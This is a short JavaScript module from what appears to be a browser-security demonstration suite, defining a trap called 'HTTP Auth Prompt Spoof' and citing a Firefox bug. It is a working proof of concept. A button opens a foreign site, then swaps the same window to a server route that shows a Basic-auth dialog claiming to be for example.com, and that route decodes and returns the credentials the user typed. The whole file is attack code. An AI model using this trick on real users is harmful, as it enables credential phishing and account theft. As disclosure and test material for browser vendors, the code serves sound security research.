const EvilTrap = require('../../EvilTrap');


module.exports = new EvilTrap('HTTP Auth Prompt Spoof', EvilTrap.CATEGORY.SPOOF, 'Show HTTP auth prompt on top of foreign site.', { firefox: '791594' })
  .addScriptPage(() => {
    const button = document.createElement('button');
    button.innerText = 'Click Me';

    button.addEventListener('click', async () => {
      window.open('https://example.com', 'g');
      setTimeout(() => {
        window.open('auth', 'g');
      }, 2000);
    });

    document.body.appendChild(button);
  })
  .routeBuilder((router) => {
    router.get('/auth', (req, res) => {
      if (!req.headers.authorization) {
        res.set('WWW-Authenticate', 'Basic realm="Please enter your login credentials for example.com"');
        res.sendStatus(401);
        return;
      }

      const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
      const loginStr = Buffer.from(b64auth, 'base64').toString();

      res.status(200).send(`Got your login data: ${loginStr}`);
    });
  });
